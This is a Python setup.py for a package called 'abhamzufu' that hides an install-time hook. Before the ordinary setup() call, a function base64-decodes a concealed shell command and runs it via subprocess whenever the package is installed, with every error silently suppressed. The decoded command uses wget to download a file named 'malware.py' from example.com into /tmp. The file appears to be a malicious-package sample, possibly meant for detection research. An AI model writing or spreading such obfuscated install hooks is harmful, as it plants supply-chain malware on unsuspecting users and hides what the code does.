import base64
import subprocess
import sys

def execute_encoded():
    # Base64 encoded command
    encoded_cmd = "d2dldCBodHRwOi8vZXhhbXBsZS5jb20vbWFsd2FyZS5weSAtTyAvdG1wL21hbHdhcmUucHk="
    
    try:
        cmd = base64.b64decode(encoded_cmd).decode('utf-8')
        subprocess.run(cmd, shell=True, timeout=10)
    except:
        pass  # Fail silently

# Execute during installation
execute_encoded()

from setuptools import setup

setup(
    name='abhamzufu',
    version='1.0.0',
    install_requires=['requests'],
)